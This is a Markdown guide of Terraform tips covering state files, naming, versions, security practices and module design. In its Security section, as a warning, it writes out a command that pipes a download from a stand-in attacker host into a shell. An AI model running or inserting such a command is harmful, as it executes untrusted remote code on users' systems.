Terraform Tips and Best Practices
=================================

- Delete resources when you're done.

- Don't modify the Terraform state file.  It will only lead to pain.

- Treat the cloud's portal website as read-only.  It's too easy for Terraform's state file and the cloud to get out-of-sync.

- When developing solutions a good path to develop the solution is:

  1. Do Click-Ops by clicking in a sandbox account to understand the cloud resources
  2. Run `terraform apply` locally until it all works
  3. Start with only cloud provider resources
  4. Add Platform Engineering team's modules where it makes sense
  5. `terraform destroy` to empty the test cloud account
  6. Switch to cloud-hosted state file into blob storage like S3
  7. Create an automation DevOps pipeline to run Terraform

  We're separating concerns and validating each piece in isolation.

- Use the [Terraform Docs](https://registry.terraform.io/providers/hashicorp/aws/latest/docs).  The docs are your best friend.

- Naming: It's best to name all resources using only use lower-case letters, numbers, and underscores.  Avoid ~~spaces~~, ~~upper-case letters~~, ~~special characters~~, and ~~emoji~~ as some services don't like unusual names.  Even if the service you're using does support these characters, other services referencing this name may not.

- Google It: Don’t hesitate to search the Terraform documentation if you’re stuck.

- GitHub Copilot and ChatGPT: These are both great for generating Terraform code.  If you know you need it but don't know how to build it, ask ChatGPT for an example.  It may not work, and it may have outdated versions, but it may get you past the blank page.

- Terraform Destroy is engineered for *all or nothing*.  You can't delete only some of your resources.  If you need to delete a few things, comment out the Terraform HCL.

- If Terraform apply is stuck, comment out the resource in the *.tf file(s), commit, uncomment the resource(s), commit.  FRAGILE: If you do this with data stores like dbs you'll lose data.

- State File restore from backup: Turn on S3 bucket versioning to recover previous state files when needed.

- Frequently update provider and module versions to the latest.  If you're using an online tutorial or example, the versions may be old.

- Frequently update the Terraform CLI both locally and on the build agent.  Newer providers or modules may not work with older CLI versions.

- Provider Version: Terraform will try to find the latest provider that works with all modules.  If terraform can't find a version that works for all the modules, it will error and do nothing.

- Separate Terraform projects: It can be helpful to separate slowly evolving or time consuming resources into separate Terraform folders.  For example, move the DB to a separate Terraform folder and DevOps build to avoid accidentally mutating -- or worse deleting -- the database.  Or move the ALB to a central Terraform folder and DevOps build to use a shared load balancer across projects or teams.

- `depends_on`:  Terraform is really good at discovering dependencies and both applying and deleting things in the correct order.  But sometimes it gets it wrong.  If it does, add gratuitous `depends_on` to help it infer the correct sequence.

- No, you can't import existing cloud infrastructure into Terraform.  Yes, technically you can, but the names will be weird, the ids will be fragile, the Terraform HCL code will be ugly, and this assumes Terraform's import found everything.  Better to write the Terraform and migrate onto new cloud infrastructure.

- Terraform modules: Be careful to include only quality, trusted, and supported modules in your Terraform code.  It could be easy to depend on an unsupported module that never receives security updates, making your system vulnerable.

- Ensure a unique state file per environment.  Never run terraform apply with a local state into the same AWS account that has S3-backed state files.  At best you'll get duplicated resources.  Probably you'll get a corrupt Terraform state file.


Security
--------

- ⚠️ Avoid Storing secrets, passwords, or secure details in your GitHub repo.

- 💡 Use AWS Secrets Manager or Parameter Store for sensitive information.

- 🎯 Use Azure DevOps secrets for build-time sensitive details.

- 😦 Be Cautious: Terraform’s state file may expose secrets.  Anyone with access to the S3 bucket can read all your secrets stored in Terraform state.

- Don't download random Terraform content from the internet and run it without first understanding what it does.  `curl http://hacker.evil./ | sh` is bad.


Modules
-------

- Opinions:  It's easy to make a module so opinionated it's unusable without first forking it.  It's also easy to make a module so customizable that there's so many optional parameters it becomes nearly impossible to use.  Find the careful balance using [SOLID](https://en.wikipedia.org/wiki/SOLID) principles.

- Policies in Modules:  It's easy to bake a policy into a module, but this is a very sharp edge, a foot-gun if you will.  Let's imagine a scenario where one defines a policy inside a module and another policy to add to it outside the module.  There is an awful race condition:

  1. Write your Terraform, debug it, and make it perfect.
  2. The next deploy succeeds and the outer policy is in place.
  3. Sometime later ... next week, next month, next year ...
  4. The build runs with updated `tags`.
  5. The module reapplies with the updated tags and the internal policy.
  6. The outer policy is not reapplied, so the module accidentally deleted your policy.
  7. Suddenly users start getting errors and your logs fill up with permission errors.

  The moral of the story:  Don't build policies in modules.  Or make it very obvious that you're doing so, and have a parameter to easily disable it.
